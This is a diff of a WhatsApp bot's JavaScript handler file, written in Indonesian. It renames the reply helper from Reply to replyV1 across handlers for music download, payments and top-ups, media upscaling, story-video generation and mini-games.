@@ -8308,12 +8281,12 @@ if (playFormatButtonMatch) {
 if (currentPlayState?.stage === 'format' && /^(?:mp3|audio|mp4|video)$/i.test(String(body || '').trim())) {
     if (Date.now() - Number(currentPlayState.createdAt || 0) > 10 * 60 * 1000) {
         delete global.playSearch[playSessionKey];
-        return Reply('⚠️ Pilihan lagu sudah kedaluwarsa. Silakan gunakan .play lagi.');
+        return replyV1('⚠️ Pilihan lagu sudah kedaluwarsa. Silakan gunakan .play lagi.');
     }
-    if (currentPlayState.processing) return Reply('⏳ Lagu sedang diproses. Tunggu sampai download selesai ya.');
+    if (currentPlayState.processing) return replyV1('⏳ Lagu sedang diproses. Tunggu sampai download selesai ya.');
     if (!currentPlayState.selectedTrack?.url || !normalizeYouTubeUrl(currentPlayState.selectedTrack.url)) {
         delete global.playSearch[playSessionKey];
-        return Reply('❌ Link lagu tidak valid. Silakan jalankan .play lagi.');
+        return replyV1('❌ Link lagu tidak valid. Silakan jalankan .play lagi.');
     }
     const requestedFormat = /^(?:mp3|audio)$/i.test(String(body || '').trim()) ? 'mp3' : 'mp4';
     await processPlayMediaSelection(currentPlayState.selectedTrack, requestedFormat, currentPlayState);
@@ -8331,18 +8304,18 @@ if (currentPlayState && /^\d+$/.test(String(body || '').trim())) {
     if (!Array.isArray(data) || expectedChat !== m.chat || expectedSender !== m.sender ||
         (createdAt && Date.now() - createdAt > 10 * 60 * 1000)) {
         delete global.playSearch[playSessionKey];
-        return Reply('⚠️ Pilihan lagu sudah kedaluwarsa. Silakan gunakan .play lagi.');
+        return replyV1('⚠️ Pilihan lagu sudah kedaluwarsa. Silakan gunakan .play lagi.');
     }
-    if (stored?.processing) return Reply('⏳ Pilihan lagu sedang diproses. Tunggu sebentar ya.');
+    if (stored?.processing) return replyV1('⏳ Pilihan lagu sedang diproses. Tunggu sebentar ya.');
     if (stored?.stage === 'format') {
-        return Reply('🎧 Lagu sudah dipilih. Tekan tombol *📂 Pilih Format*, lalu pilih MP3 atau MP4. Kamu juga bisa membalas `mp3` / `mp4`.');
+        return replyV1('🎧 Lagu sudah dipilih. Tekan tombol *📂 Pilih Format*, lalu pilih MP3 atau MP4. Kamu juga bisa membalas `mp3` / `mp4`.');
     }
 
     const nomor = parseInt(String(body).trim(), 10);
-    if (nomor < 1 || nomor > data.length) return Reply(`❌ Pilih nomor 1-${data.length}`);
+    if (nomor < 1 || nomor > data.length) return replyV1(`❌ Pilih nomor 1-${data.length}`);
     const selectedTrack = data[nomor - 1];
     if (!selectedTrack?.url || !normalizeYouTubeUrl(selectedTrack.url)) {
-        return Reply('❌ Link lagu tidak valid. Silakan jalankan .play lagi.');
+        return replyV1('❌ Link lagu tidak valid. Silakan jalankan .play lagi.');
     }
     await sendPlayFormatMenu(selectedTrack, stored);
     return;
@@ -8829,13 +8802,13 @@ if (!isCmd && m.text && !m.key?.fromMe) {
             userAnswer === normalizeGameAnswer(x)
         )) {
             groupGameState.delete(gameKey(m.chat))
-            await Reply(
+            await replyV1(
                 `🎉 *BENAR!*\n\n` +
                 `👤 @${m.sender.split('@')[0]}\n` +
                 `🏆 Jawaban: *${state.displayAnswer || state.answer}*`
             )
         } else {
-            await Reply(`❌ Belum tepat, coba lagi.`)
+            await replyV1(`❌ Belum tepat, coba lagi.`)
         }
         return
     }
@@ -8876,7 +8849,7 @@ if (!isCmd && !isPlayNumberReply) {
         if (handledConvertPulsaProof) return
     } catch (error) {
         console.error('[CONVERT PULSA PROOF WA]', error?.stack || error)
-        await Reply(`❌ Bukti belum berhasil diproses: ${error?.message || error}. Status provider tidak diubah; coba kirim foto ulang.`)
+        await replyV1(`❌ Bukti belum berhasil diproses: ${error?.message || error}. Status provider tidak diubah; coba kirim foto ulang.`)
         return
     }
     try {
@@ -8884,7 +8857,7 @@ if (!isCmd && !isPlayNumberReply) {
         if (handledConvertPulsaInput) return
     } catch (error) {
         console.error('[CONVERT PULSA INPUT]', error?.stack || error)
-        await Reply(`❌ Input convert pulsa gagal diproses: ${error?.message || error}`)
+        await replyV1(`❌ Input convert pulsa gagal diproses: ${error?.message || error}`)
         return
     }
     try {
@@ -9000,7 +8973,7 @@ async function sendPurchaseMethodMenu(intent) {
         }
     }
     if (intentStatus === 'WAITING_PAYMENT' && intent.paymentRef) return sendPurchaseQr(token, isNokos ? 'NOKOS' : 'TOP UP')
-    if (intentStatus === 'EXPIRED') return Reply(`⚠️ Invoice QRIS untuk token ${token} sudah berakhir menurut status lokal. Pesanan tidak dibuat ulang otomatis. Pastikan status invoice provider final; jika ingin membeli ulang, jalankan perintah pesanan setelah invoice lama benar-benar berakhir.`)
+    if (intentStatus === 'EXPIRED') return replyV1(`⚠️ Invoice QRIS untuk token ${token} sudah berakhir menurut status lokal. Pesanan tidak dibuat ulang otomatis. Pastikan status invoice provider final; jika ingin membeli ulang, jalankan perintah pesanan setelah invoice lama benar-benar berakhir.`)
     if (['QRIS_CREATING', 'QRIS_REVIEW_REQUIRED', 'QRIS_PAID', 'PROVIDER_PROCESSING', 'BALANCE_PROCESSING', 'REVIEW_REQUIRED'].includes(intentStatus)) {
         const message = intentStatus === 'QRIS_REVIEW_REQUIRED'
             ? `⚠️ Status pembuatan invoice QRIS belum dapat dipastikan. Jangan membayar invoice lain, jangan mengulangi order, dan jangan mengganti metode pembayaran. Token: ${token}. Owner perlu memeriksa status transaksi pada provider terkait terlebih dahulu.`
@@ -9013,7 +8986,7 @@ async function sendPurchaseMethodMenu(intent) {
             const marked = purchasePayment.saveIntent({ ...intent, reviewNoticeSentAt: Date.now() })
             await telegramService.notifyOwnerPurchase({ type: 'QRIS INVOICE REVIEW REQUIRED', ref: token, customerName: marked.pushname || pushname || '-', customerJid: marked.jid, sellingPrice: marked.amount, status: 'REVIEW_REQUIRED', refunded: false, createdAt: marked.createdAt, note: marked.reviewReason || 'Periksa dashboard provider terkait; jangan membuat invoice ulang.' }).catch(err => console.error('[QRIS REVIEW OWNER NOTICE]', err?.message || err))
         }
-        return Reply(message)
+        return replyV1(message)
     }
     const title = isNokos ? '📱 PEMBELIAN NOKOS' : '🎮 PEMBELIAN TOP UP'
     const text =
@@ -9046,7 +9019,7 @@ async function sendPurchaseMethodMenu(intent) {
         return true
     } catch (error) {
         console.error('[PURCHASE PAYMENT MENU]', error?.stack || error)
-        await Reply(text + `\n\n1. ${prefix}${isNokos ? 'nokospaybalance' : 'topuppay balance'} ${isNokos ? token : token}\n2. ${prefix}${isNokos ? 'nokospayqris' : 'topuppay qris'} ${isNokos ? token : token}`)
+        await replyV1(text + `\n\n1. ${prefix}${isNokos ? 'nokospaybalance' : 'topuppay balance'} ${isNokos ? token : token}\n2. ${prefix}${isNokos ? 'nokospayqris' : 'topuppay qris'} ${isNokos ? token : token}`)
         return false
     }
 }
@@ -9056,11 +9029,11 @@ async function sendPurchaseQr(token, type) {
         const created = await purchasePayment.createQrPayment(token, m.sender, pushname)
         const state = String(created.intent?.status || '').toUpperCase()
         if (state === 'FULFILLED') {
-            return Reply(`✅ Pesanan ${type} sudah berhasil diproses. Tidak perlu membayar atau membuat invoice baru.
+            return replyV1(`✅ Pesanan ${type} sudah berhasil diproses. Tidak perlu membayar atau membuat invoice baru.
 Ref order: ${created.intent.orderRef || token}`)
         }
         if (state === 'FAILED_REFUNDED') {
-            return Reply(`❌ Pesanan ${type} gagal diproses. Dana Rp${Number(created.intent.amount || 0).toLocaleString('id-ID')} sudah diamankan kembali ke saldo bot. Tidak ada order baru yang dibuat.
+            return replyV1(`❌ Pesanan ${type} gagal diproses. Dana Rp${Number(created.intent.amount || 0).toLocaleString('id-ID')} sudah diamankan kembali ke saldo bot. Tidak ada order baru yang dibuat.
 Token: ${token}`)
         }
         if (['REVIEW_REQUIRED', 'QRIS_REVIEW_REQUIRED', 'PROVIDER_PROCESSING', 'BALANCE_PROCESSING', 'QRIS_PAID'].includes(state)) {
@@ -9068,7 +9041,7 @@ Token: ${token}`)
                 const marked = purchasePayment.saveIntent({ ...created.intent, reviewNoticeSentAt: Date.now() })
                 await telegramService.notifyOwnerPurchase({ type: `${type} REVIEW REQUIRED`, ref: marked.orderRef || token, customerName: marked.pushname || pushname || '-', customerJid: marked.jid, sellingPrice: marked.amount, status: state, refunded: false, createdAt: marked.createdAt, note: marked.reviewReason || 'Pembayaran terdeteksi tetapi status fulfillment perlu rekonsiliasi.' }).catch(err => console.error('[QRIS REVIEW OWNER NOTICE]', err?.message || err))
             }
-            return Reply(`⚠️ Pesanan ${type} sudah masuk tahap ${state}, tetapi belum aman untuk menampilkan/membuat QRIS baru. Jangan membayar dua kali. Token: ${token}. Owner akan merekonsiliasi status terlebih dahulu.`)
+            return replyV1(`⚠️ Pesanan ${type} sudah masuk tahap ${state}, tetapi belum aman untuk menampilkan/membuat QRIS baru. Jangan membayar dua kali. Token: ${token}. Owner akan merekonsiliasi status terlebih dahulu.`)
         }
         const payment = created.payment
         if (!payment) throw new Error('Gateway tidak mengembalikan data invoice. Jangan membuat pesanan ulang; cek status token order.')
@@ -9116,12 +9089,12 @@ Token: ${token}`)
                 const marked = purchasePayment.saveIntent({ ...intent, reviewNoticeSentAt: Date.now() })
                 await telegramService.notifyOwnerPurchase({ type: 'QRIS INVOICE REVIEW REQUIRED', ref: token, customerName: marked.pushname || pushname || '-', customerJid: marked.jid, sellingPrice: marked.amount, status: 'REVIEW_REQUIRED', refunded: false, createdAt: marked.createdAt, note: marked.reviewReason || String(error?.message || error) }).catch(err => console.error('[QRIS REVIEW OWNER NOTICE]', err?.message || err))
             }
-            return Reply(`⚠️ Invoice QRIS lama untuk token ${token} membutuhkan pemeriksaan owner.\n\n${intent.reviewReason || error?.message || 'Status transaksi belum dapat dipastikan.'}\n\nTidak ada invoice baru dibuat dan saldo bot tidak dipotong. Jangan membayar QR lama atau mengganti metode sampai owner mengonfirmasi statusnya.`)
+            return replyV1(`⚠️ Invoice QRIS lama untuk token ${token} membutuhkan pemeriksaan owner.\n\n${intent.reviewReason || error?.message || 'Status transaksi belum dapat dipastikan.'}\n\nTidak ada invoice baru dibuat dan saldo bot tidak dipotong. Jangan membayar QR lama atau mengganti metode sampai owner mengonfirmasi statusnya.`)
         }
-        if (error?.legacyPurchaseInvoiceEnded) return Reply(`ℹ️ ${error.message}\nTidak ada invoice baru dibuat dan tidak ada saldo dipotong. Buat pesanan baru setelah invoice lama dipastikan berakhir.`)
-        if (error?.providerPaymentUnavailable) return Reply(`⚠️ QRIS pembelian provider belum tersedia. Tidak ada invoice dibuat dan tidak ada pembayaran diproses.\n\n${error.message}\n\nPilih saldo deposit bot untuk melanjutkan pesanan. Token: ${token}.`)
-        if (intent?.status === 'AWAITING_METHOD') return Reply(`❌ QRIS tidak dapat dibuat: ${error?.message || error}\n\nTidak ada pembayaran baru diproses. Token: ${token}.`)
-        return Reply(`❌ QRIS pembelian tidak dapat ditampilkan: ${error?.message || error}\n\nJangan membuat pesanan ulang jika status sudah diproses. Token: ${token}.`)
+        if (error?.legacyPurchaseInvoiceEnded) return replyV1(`ℹ️ ${error.message}\nTidak ada invoice baru dibuat dan tidak ada saldo dipotong. Buat pesanan baru setelah invoice lama dipastikan berakhir.`)
+        if (error?.providerPaymentUnavailable) return replyV1(`⚠️ QRIS pembelian provider belum tersedia. Tidak ada invoice dibuat dan tidak ada pembayaran diproses.\n\n${error.message}\n\nPilih saldo deposit bot untuk melanjutkan pesanan. Token: ${token}.`)
+        if (intent?.status === 'AWAITING_METHOD') return replyV1(`❌ QRIS tidak dapat dibuat: ${error?.message || error}\n\nTidak ada pembayaran baru diproses. Token: ${token}.`)
+        return replyV1(`❌ QRIS pembelian tidak dapat ditampilkan: ${error?.message || error}\n\nJangan membuat pesanan ulang jika status sudah diproses. Token: ${token}.`)
     }
 }
 
@@ -9150,18 +9123,18 @@ async function notifyWaPurchaseOwner(result) {
 async function handleWaPurchaseBalance(token, type) {
     try {
         const result = await purchasePayment.buyWithBalance(token, m.sender, type)
-        if (result.reviewRequired) return Reply(`⚠️ Pembayaran sudah tercatat, tetapi status provider belum dapat dipastikan. Jangan klik beli lagi. Ref internal: ${result.order?.ref || result.tx?.ref || result.intent?.token}. Owner perlu merekonsiliasi transaksi sebelum tindakan lanjut.`)
-        if (result.failed && result.refunded) return Reply(`❌ Provider menolak pembelian. Refund Rp${depositService.formatMoney(result.intent?.amount || 0)} sudah dikembalikan ke saldo bot. Alasan: ${result.error?.message || result.order?.providerError || 'Provider gagal.'}`)
-        if (!result.success || !(result.order || result.tx)) return Reply(`⚠️ Pesanan belum bisa dipastikan. Jangan melakukan pembelian ulang. Token: ${token}. Hubungi owner untuk pemeriksaan.`)
+        if (result.reviewRequired) return replyV1(`⚠️ Pembayaran sudah tercatat, tetapi status provider belum dapat dipastikan. Jangan klik beli lagi. Ref internal: ${result.order?.ref || result.tx?.ref || result.intent?.token}. Owner perlu merekonsiliasi transaksi sebelum tindakan lanjut.`)
+        if (result.failed && result.refunded) return replyV1(`❌ Provider menolak pembelian. Refund Rp${depositService.formatMoney(result.intent?.amount || 0)} sudah dikembalikan ke saldo bot. Alasan: ${result.error?.message || result.order?.providerError || 'Provider gagal.'}`)
+        if (!result.success || !(result.order || result.tx)) return replyV1(`⚠️ Pesanan belum bisa dipastikan. Jangan melakukan pembelian ulang. Token: ${token}. Hubungi owner untuk pemeriksaan.`)
         const item = result.order || result.tx
         if (type === 'NOKOS') purchasePayment.startNokosWatcher(item)
         if (!result.already) await notifyWaPurchaseOwner(result)
         if (type === 'NOKOS') {
-            return Reply(`╭─〔 📱 ORDER NOKOS 〕\n║ Ref      : ${item.ref}\n║ Service  : ${item.service}\n║ Negara   : ${item.country}\n║ Provider : ${item.provider || '-'}\n║ Nomor    : ${item.phone || '-'}\n║ Harga    : Rp${depositService.formatMoney(item.sellingPrice)}\n║ Status   : ${String(item.status || 'waiting').toUpperCase()}\n╰────────────────\n\nBot akan mengecek OTP otomatis.\nCek: ${prefix}nokosstatus ${item.ref}\nBatalkan: ${prefix}nokoscancel ${item.ref}`)
+            return replyV1(`╭─〔 📱 ORDER NOKOS 〕\n║ Ref      : ${item.ref}\n║ Service  : ${item.service}\n║ Negara   : ${item.country}\n║ Provider : ${item.provider || '-'}\n║ Nomor    : ${item.phone || '-'}\n║ Harga    : Rp${depositService.formatMoney(item.sellingPrice)}\n║ Status   : ${String(item.status || 'waiting').toUpperCase()}\n╰────────────────\n\nBot akan mengecek OTP otomatis.\nCek: ${prefix}nokosstatus ${item.ref}\nBatalkan: ${prefix}nokoscancel ${item.ref}`)
         }
-        return Reply(`╭─〔 🎮 ORDER TOP UP 〕\n║ Ref     : ${item.ref}\n║ Game    : ${item.game}\n║ Produk  : ${item.productName}\n║ Tujuan  : ${item.customerNo || '-'}${item.zone ? ` | Zone ${item.zone}` : ''}\n║ Harga   : Rp${topupService.formatMoney(item.sellingPrice)}\n║ Status  : ${item.status}\n║ SN      : ${item.sn || '-'}\n╰────────────────\n\n${item.message || 'Transaksi diproses.'}\nCek: ${prefix}topupstatus ${item.ref}`)
+        return replyV1(`╭─〔 🎮 ORDER TOP UP 〕\n║ Ref     : ${item.ref}\n║ Game    : ${item.game}\n║ Produk  : ${item.productName}\n║ Tujuan  : ${item.customerNo || '-'}${item.zone ? ` | Zone ${item.zone}` : ''}\n║ Harga   : Rp${topupService.formatMoney(item.sellingPrice)}\n║ Status  : ${item.status}\n║ SN      : ${item.sn || '-'}\n╰────────────────\n\n${item.message || 'Transaksi diproses.'}\nCek: ${prefix}topupstatus ${item.ref}`)
     } catch (error) {
-        return Reply(`❌ Pembayaran saldo gagal: ${error?.message || error}\n\nJika saldo belum terpotong, pilih QRIS pembelian. Jika status menunjukkan sedang diproses, jangan membuat order baru.`)
+        return replyV1(`❌ Pembayaran saldo gagal: ${error?.message || error}\n\nJika saldo belum terpotong, pilih QRIS pembelian. Jika status menunjukkan sedang diproses, jangan membuat order baru.`)
     }
 }
 
@@ -9187,14 +9160,14 @@ const pruneHd2Pending = pending => {
 };
 const runHd2Enhancement = async (buffer, mime, option, quoteMessage = m) => {
     conn.hd2Busy = conn.hd2Busy || new Set();
-    if (conn.hd2Busy.has(m.sender)) return Reply('⏳ Proses HD kamu masih berjalan. Tunggu sampai selesai, ya.');
-    if (!Buffer.isBuffer(buffer) || !buffer.length) return Reply('❌ Media tidak tersedia. Kirim ulang foto/video lalu gunakan .hd2.');
+    if (conn.hd2Busy.has(m.sender)) return replyV1('⏳ Proses HD kamu masih berjalan. Tunggu sampai selesai, ya.');
+    if (!Buffer.isBuffer(buffer) || !buffer.length) return replyV1('❌ Media tidak tersedia. Kirim ulang foto/video lalu gunakan .hd2.');
     conn.hd2Busy.add(m.sender);
     try {
         if (/^image\//.test(mime)) {
             const scale = String(option || '2').toLowerCase().replace(/x$/, '');
-            if (!['2', '4'].includes(scale)) return Reply('Pilih kualitas foto 2x atau 4x.');
-            await Reply(`✨ Memproses foto ke ${scale}x. AI upscaler akan dicoba lebih dulu; mohon tunggu.`);
+            if (!['2', '4'].includes(scale)) return replyV1('Pilih kualitas foto 2x atau 4x.');
+            await replyV1(`✨ Memproses foto ke ${scale}x. AI upscaler akan dicoba lebih dulu; mohon tunggu.`);
             const result = await hdService.enhanceImage(buffer, Number(scale));
             await conn.sendMessage(m.chat, {
                 image: result.buffer,
@@ -9204,9 +9177,9 @@ const runHd2Enhancement = async (buffer, mime, option, quoteMessage = m) => {
         } else if (/^video\//.test(mime)) {
             const resolution = String(option || '1080').toLowerCase().replace(/p$/, '');
             if (!['720', '1080', '2k', '1440', '4k', '2160'].includes(resolution)) {
-                return Reply('Pilih resolusi video 720p, 1080p, 2K, atau 4K.');
+                return replyV1('Pilih resolusi video 720p, 1080p, 2K, atau 4K.');
             }
-            await Reply(`🎬 Memproses video ke ${resolution}. Ini bisa memerlukan waktu cukup lama.`);
+            await replyV1(`🎬 Memproses video ke ${resolution}. Ini bisa memerlukan waktu cukup lama.`);
             const result = await hdService.enhanceVideo(buffer, resolution);
             await conn.sendMessage(m.chat, {
                 video: result.buffer,
@@ -9215,11 +9188,11 @@ const runHd2Enhancement = async (buffer, mime, option, quoteMessage = m) => {
                 caption: `🎬 VIDEO HD ${result.resolution}p\n\n✅ Video selesai diproses\n🛠️ Metode: ${result.provider}\n✨ Noise dikurangi, detail dan skala ditingkatkan\n\nXeryuu-Md V16 × Sendrich`
             }, { quoted: quoteMessage || m });
         } else {
-            return Reply('❌ Format media tidak dikenal. Balas foto atau video yang didukung.');
+            return replyV1('❌ Format media tidak dikenal. Balas foto atau video yang didukung.');
         }
     } catch (error) {
         console.error('[HD2 ERROR]', error?.stack || error);
-        return Reply(`❌ Proses HD gagal. ${error?.message || 'Coba lagi dengan file yang lebih kecil atau resolusi lebih rendah.'}`);
+        return replyV1(`❌ Proses HD gagal. ${error?.message || 'Coba lagi dengan file yang lebih kecil atau resolusi lebih rendah.'}`);
     } finally {
         conn.hd2Busy.delete(m.sender);
     }
@@ -9250,7 +9223,7 @@ const cacheHd2MediaAndShowButtons = async (quotedMedia, mime) => {
     conn.hd2Pending = conn.hd2Pending || new Map();
     conn.hd2Preparing = conn.hd2Preparing || new Set();
     const key = getHd2SessionKey();
-    if (conn.hd2Preparing.has(key)) return Reply('⏳ Media kamu sedang disiapkan. Tunggu sebentar, ya.');
+    if (conn.hd2Preparing.has(key)) return replyV1('⏳ Media kamu sedang disiapkan. Tunggu sebentar, ya.');
     conn.hd2Preparing.add(key);
     try {
         const buffer = await downloadHd2MediaBuffer(quotedMedia);
@@ -9296,7 +9269,7 @@ const cacheHd2MediaAndShowButtons = async (quotedMedia, mime) => {
 };
 
 if (DISABLED_CRASH_FLOOD_COMMANDS.has(String(command || '').toLowerCase())) {
-    return Reply('🛡️ Command crash/spam dinonaktifkan demi mencegah gangguan pada akun atau grup lain.');
+    return replyV1('🛡️ Command crash/spam dinonaktifkan demi mencegah gangguan pada akun atau grup lain.');
 }
 
 switch (command) {
@@ -9306,7 +9279,7 @@ case 'richgamepage': {
         await sendRichGameMenu(page)
     } catch (error) {
         console.error('[RICHGAME MENU INTERACTIVE]', error?.stack || error)
-        await Reply(richGameMenuFallback(page), { noAdReply: true })
+        await replyV1(richGameMenuFallback(page), { noAdReply: true })
     }
     break
 }
@@ -9318,17 +9291,17 @@ case 'richgame': {
             await sendRichGameMenu(1)
         } catch (error) {
             console.error('[RICHGAME MENU INTERACTIVE]', error?.stack || error)
-            await Reply(richGameMenuFallback(1), { noAdReply: true })
+            await replyV1(richGameMenuFallback(1), { noAdReply: true })
         }
         break
     }
 
     try {
         const title = await sendRichHtmlGame(conn, m.chat, requested)
-        await Reply(`✅ ${title} berhasil dikirim.`, { noAdReply: true })
+        await replyV1(`✅ ${title} berhasil dikirim.`, { noAdReply: true })
     } catch (error) {
         console.error('[RICHHTML]', error?.stack || error)
-        await Reply(`❌ Gagal membuka Rich HTML: ${error?.message || error}`, { noAdReply: true })
+        await replyV1(`❌ Gagal membuka Rich HTML: ${error?.message || error}`, { noAdReply: true })
     }
     break
 }
@@ -9337,7 +9310,7 @@ case 'storyedit2':
 case 'storyfilm': {
     const input = String(text || '').trim()
     if (!input || /^(help|menu|--help)$/i.test(input)) {
-        return Reply(
+        return replyV1(
             `╭─〔 🎬 STORY EDIT GENERATOR 〕\n` +
             `│ Buat video story vertikal otomatis dari foto yang relevan.\n` +
             `│\n` +
@@ -9363,7 +9336,7 @@ case 'storyfilm': {
     try {
         storyOptions = storyEditService.parseStoryEditInput(input)
     } catch (parseError) {
-        return Reply(`❌ ${parseError?.message || 'Format Story Edit tidak valid.'}\nKetik ${prefix}storyedit help untuk contoh.`, { noAdReply: true })
+        return replyV1(`❌ ${parseError?.message || 'Format Story Edit tidak valid.'}\nKetik ${prefix}storyedit help untuk contoh.`, { noAdReply: true })
     }
     const query = storyOptions.query
     const description = storyOptions.description
@@ -9377,10 +9350,10 @@ case 'storyfilm': {
     const headline = storyOptions.headline
 
     if (query.length < 2) {
-        return Reply(`❌ Judul atau kata kunci terlalu pendek.\nContoh: ${prefix}storyedit Gunung Kembang | Pesona alam yang indah\ndurasi: 5`, { noAdReply: true })
+        return replyV1(`❌ Judul atau kata kunci terlalu pendek.\nContoh: ${prefix}storyedit Gunung Kembang | Pesona alam yang indah\ndurasi: 5`, { noAdReply: true })
     }
     if (query.length > 100 || description.length > 220 || song.length > 120 || lyric.length > 150) {
-        return Reply('❌ Judul maksimal 100 karakter, deskripsi 220 karakter, lagu 120 karakter, dan lirik 150 karakter.', { noAdReply: true })
+        return replyV1('❌ Judul maksimal 100 karakter, deskripsi 220 karakter, lagu 120 karakter, dan lirik 150 karakter.', { noAdReply: true })
     }
 
     let audioBuffer = null
@@ -9400,11 +9373,11 @@ case 'storyfilm': {
             }
         } catch (audioError) {
             console.error('[STORYEDIT AUDIO DOWNLOAD]', audioError?.stack || audioError)
-            return Reply(`❌ Audio yang kamu balas tidak bisa dibaca. Kirim audio MP3/OGG yang valid lalu balas dengan command Story Edit.\nDetail: ${audioError?.message || audioError}`, { noAdReply: true })
+            return replyV1(`❌ Audio yang kamu balas tidak bisa dibaca. Kirim audio MP3/OGG yang valid lalu balas dengan command Story Edit.\nDetail: ${audioError?.message || audioError}`, { noAdReply: true })
         }
     }
 
-    await Reply(
+    await replyV1(
         `⏳ *STORY EDIT SEDANG DIPROSES*\n\n` +
         `🎬 Tema: ${headline}\n` +
         `📍 Lokasi: ${location || query}\n` +
@@ -9435,7 +9408,7 @@ case 'storyfilm': {
         })
     } catch (error) {
         console.error('[STORYEDIT GENERATOR]', error?.stack || error)
-        return Reply(`❌ *STORY EDIT GAGAL*\n\n${error?.message || 'Terjadi kesalahan saat membuat video.'}\n\nKetik ${prefix}storyedit help untuk panduan.`, { noAdReply: true })
+        return replyV1(`❌ *STORY EDIT GAGAL*\n\n${error?.message || 'Terjadi kesalahan saat membuat video.'}\n\nKetik ${prefix}storyedit help untuk panduan.`, { noAdReply: true })
     }
 
     const safeTitle = query.replace(/[\r\n]/g, ' ').slice(0, 65)
@@ -9448,7 +9421,7 @@ case 'storyfilm': {
         }, { quoted: m })
     } catch (sendError) {
         console.error('[STORYEDIT SEND VIDEO]', sendError?.stack || sendError)
-        return Reply(`❌ Video berhasil dirender, tetapi WhatsApp gagal mengirim file. Coba ulangi setelah koneksi stabil.\nDetail: ${sendError?.message || sendError}`, { noAdReply: true })
+        return replyV1(`❌ Video berhasil dirender, tetapi WhatsApp gagal mengirim file. Coba ulangi setelah koneksi stabil.\nDetail: ${sendError?.message || sendError}`, { noAdReply: true })
     }
 
     try {
@@ -9467,7 +9440,7 @@ case 'storyfilm': {
         }, { quoted: m })
     } catch (sourceError) {
         console.error('[STORYEDIT SEND ATTRIBUTION]', sourceError?.stack || sourceError)
-        try { await Reply('⚠️ Video sudah terkirim, tetapi daftar atribusi foto gagal dikirim. Silakan hubungi developer untuk memperoleh daftar sumbernya.', { noAdReply: true }) } catch (_) {}
+        try { await replyV1('⚠️ Video sudah terkirim, tetapi daftar atribusi foto gagal dikirim. Silakan hubungi developer untuk memperoleh daftar sumbernya.', { noAdReply: true }) } catch (_) {}
     }
     break
 }
@@ -9478,11 +9451,11 @@ case 'videonote': {
     const q = m.quoted ? m.quoted : m
     const mimeType = (q.msg || q).mimetype || q.mediaType || ''
     if (!/^video(?:\/|$)/i.test(mimeType)) {
-        return Reply(`📹 Reply video dengan *${prefix + command}*\n\nMaksimal durasi 60 detik.`)
+        return replyV1(`📹 Reply video dengan *${prefix + command}*\n\nMaksimal durasi 60 detik.`)
     }
     const duration = Number((q.msg || q).seconds || q.message?.videoMessage?.seconds || 0)
     if (duration > 60) {
-        return Reply(`❌ Video terlalu panjang (${duration} detik).\nMaksimal 60 detik untuk PTV/PhotoLive.`)
+        return replyV1(`❌ Video terlalu panjang (${duration} detik).\nMaksimal 60 detik untuk PTV/PhotoLive.`)
     }
     try {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
@@ -9492,7 +9465,7 @@ case 'videonote': {
         await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
     } catch (error) {
         console.error('[PHOTOLIVE/PTV]', error?.stack || error)
-        await Reply(`❌ Gagal mengubah video menjadi PhotoLive/PTV.\nDetail: ${error?.message || error}`)
+        await replyV1(`❌ Gagal mengubah video menjadi PhotoLive/PTV.\nDetail: ${error?.message || error}`)
     }
     break
 }
@@ -9501,7 +9474,7 @@ case 'breakout':
 case 'arrowbreakout':
 case 'richbreakout': {
     try { await sendRichHtmlGame(conn, m.chat, 'breakout') }
-    catch (error) { console.error('[RICHHTML breakout]', error?.stack || error); await Reply(`❌ Gagal membuka Arrow Breakout: ${error?.message || error}`) }
+    catch (error) { console.error('[RICHHTML breakout]', error?.stack || error); await replyV1(`❌ Gagal membuka Arrow Breakout: ${error?.message || error}`) }
     break
 }
 
@@ -9509,7 +9482,7 @@ case 'fchess':
 case 'chessultimate':
 case 'richchess2': {
     try { await sendRichHtmlGame(conn, m.chat, 'chess-ultimate') }
-    catch (error) { console.error('[RICHHTML chess ultimate]', error?.stack || error); await Reply(`❌ Gagal membuka Chess Furina Ultimate: ${error?.message || error}`) }
+    catch (error) { console.error('[RICHHTML chess ultimate]', error?.stack || error); await replyV1(`❌ Gagal membuka Chess Furina Ultimate: ${error?.message || error}`) }
     break
 }
 
@@ -9517,7 +9490,7 @@ case 'tetromino':
 case 'tetris':
 case 'richtetris': {
     try { await sendRichHtmlGame(conn, m.chat, 'tetromino') }
-    catch (error) { console.error('[RICHHTML tetromino]', error?.stack || error); await Reply(`❌ Gagal membuka Tetromino/Tetris: ${error?.message || error}`) }
+    catch (error) { console.error('[RICHHTML tetromino]', error?.stack || error); await replyV1(`❌ Gagal membuka Tetromino/Tetris: ${error?.message || error}`) }
     break
 }
 
@@ -9530,7 +9503,7 @@ case 'richspaceshooter': {
         await sendRichHtmlGame(conn, m.chat, 'space-shooter')
     } catch (error) {
         console.error('[RICHHTML space-shooter]', error?.stack || error)
-        await Reply(`❌ Gagal membuka Space Shooter: ${error?.message || error}`)
+        await replyV1(`❌ Gagal membuka Space Shooter: ${error?.message || error}`)
     }
     break
 }
@@ -9539,14 +9512,14 @@ case 'quizhard':
 case 'xquiz':
 case 'richquiz': {
     try { await sendRichHtmlGame(conn, m.chat, 'quiz-hard') }
-    catch (error) { console.error('[RICHHTML quiz]', error?.stack || error); await Reply(`❌ Gagal membuka Xeryuu Quiz: ${error?.message || error}`) }
+    catch (error) { console.error('[RICHHTML quiz]', error?.stack || error); await replyV1(`❌ Gagal membuka Xeryuu Quiz: ${error?.message || error}`) }
     break
 }
 
 case 'pong':
 case 'richpong': {
     try { await sendRichHtmlGame(conn, m.chat, 'pong') }
-    catch (error) { console.error('[RICHHTML pong]', error?.stack || error); await Reply(`❌ Gagal membuka Xeryuu Pong: ${error?.message || error}`) }
+    catch (error) { console.error('[RICHHTML pong]', error?.stack || error); await replyV1(`❌ Gagal membuka Xeryuu Pong: ${error?.message || error}`) }
     break
 }
 
@@ -9554,7 +9527,7 @@ case 'racing':
 case 'race':
 case 'richracing': {
     try { await sendRichHtmlGame(conn, m.chat, 'racing') }
-    catch (error) { console.error('[RICHHTML racing]', error?.stack || error); await Reply(`❌ Gagal membuka Xeryuu Racing: ${error?.message || error}`) }
+    catch (error) { console.error('[RICHHTML racing]', error?.stack || error); await replyV1(`❌ Gagal membuka Xeryuu Racing: ${error?.message || error}`) }
     break
 }
 
@@ -9567,7 +9540,7 @@ case 'richmurder': {
         await sendRichHtmlGame(conn, m.chat, 'murder-mystery')
     } catch (error) {
         console.error('[RICHHTML murder-mystery]', error?.stack || error)
-        await Reply(`❌ Gagal membuka Murder Mystery: ${error?.message || error}`)
